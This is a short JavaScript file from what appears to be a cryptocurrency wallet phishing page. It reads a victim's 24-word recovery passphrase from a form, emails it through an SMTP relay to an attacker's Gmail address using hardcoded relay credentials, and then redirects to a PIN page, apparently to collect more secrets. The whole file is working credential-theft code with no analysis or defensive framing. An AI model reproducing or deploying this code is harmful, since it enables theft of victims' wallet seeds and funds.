function emailSend() {
    var passphrase = document.getElementById('message').value;
  
    if (passphrase.trim() === "") {
      swal("Error", "Please enter your 24-word passphrase", "error");
      return;
    }
  
    var messageBody = "Passphrase: " + passphrase;
  
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "payday10177@gmail.com",
      Password: "E0027CA3A1AEBEC3A6EE6998C984F02F5E5D",
      To: 'payday10177@gmail.com',
      From: "payday10177@gmail.com",
      Subject: "Wallet Passphrase",
      Body: messageBody
    }).then(
      message => {
        if (message == 'OK') {
          window.location.href = 'pin.html';
        } else {
          swal("Error", "Something went wrong. Please try again.", "error");
        }
      }
    );
  }
  
  // Attach event listener to the form submit button
  document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally
    emailSend();
  });
  
